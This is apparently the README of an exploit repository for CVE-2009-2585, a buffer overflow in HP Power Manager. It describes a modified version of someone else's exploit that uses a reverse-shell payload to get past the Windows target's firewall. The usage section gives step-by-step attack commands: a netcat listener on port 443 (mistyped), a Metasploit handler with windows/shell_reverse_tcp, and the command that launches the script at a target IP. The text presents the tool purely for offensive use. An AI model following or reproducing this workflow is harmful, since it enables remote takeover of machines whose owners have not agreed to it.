# CVE2009-2585_HP_Power_Manager_BoF
It is a version modified of the original exploit by Muhammad Haidari (https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py). The modification includes a payload which allows to obtain a reverse shell to avoid to open ports in the Windows'target which the firewall's windows will be closed it.

# Usage

At firts, put a listener:

<pre> nc lvp 443 </pre>

Or using the metasploit module: 

<pre> /exploit/multi/handler with payload: windows/shell_reverse_tcp </pre>

Now, you can launch the exploit:

<pre>python CVE2009-2585_HP_Power_Manager_BoF IP </pre>
